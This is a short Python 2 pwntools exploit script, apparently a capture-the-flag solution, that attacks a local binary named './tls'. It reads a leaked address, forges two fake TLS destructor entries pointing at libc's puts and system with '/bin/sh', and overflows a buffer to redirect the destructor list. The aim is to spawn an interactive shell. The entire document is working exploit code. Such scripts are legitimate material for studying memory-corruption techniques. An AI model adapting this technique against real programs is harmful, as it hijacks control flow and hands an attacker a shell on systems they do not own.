from pwn import *

libc_base_addr = 0x7ffff7a15000
system_addr = libc_base_addr + 0x46590
puts_addr = libc_base_addr + 0x6fd60
binsh_addr = libc_base_addr + 0x17c8c3

p = process('./tls')

p.recvuntil("address: ")
r = p.recvuntil("\n")
mapped_addr = int(r, 16)
print "[*]mapped_addr: " + hex(mapped_addr)

# let's make fake two tls_dtor, one for printing a message--puts('/bin/sh')
# the other for execute system('/bin/sh')
# fake tls_dtor1
payload = p64(0) + p64(0x31) + p64(puts_addr) + p64(binsh_addr) + p64(mapped_addr + 0x100) + p64(mapped_addr + 0x40)
#payload += p64(0) + p64(0x21) + 'a' * 0x10
# fake tls_dtor2
payload += p64(0) + p64(0x31) + p64(system_addr) + p64(binsh_addr) + p64(mapped_addr + 0x100) + p64(0)
#payload += p64(0) + p64(0x21) + 'a' * 0x10

#print len(payload)
payload += 'a' * (0x100000 - 0x60 + 0x16E0) + p64(mapped_addr + 0x10)

#raw_input("go?")
p.sendline(payload)

print "pwning...."
print "Got a shell!"
sleep(1)
p.interactive() 
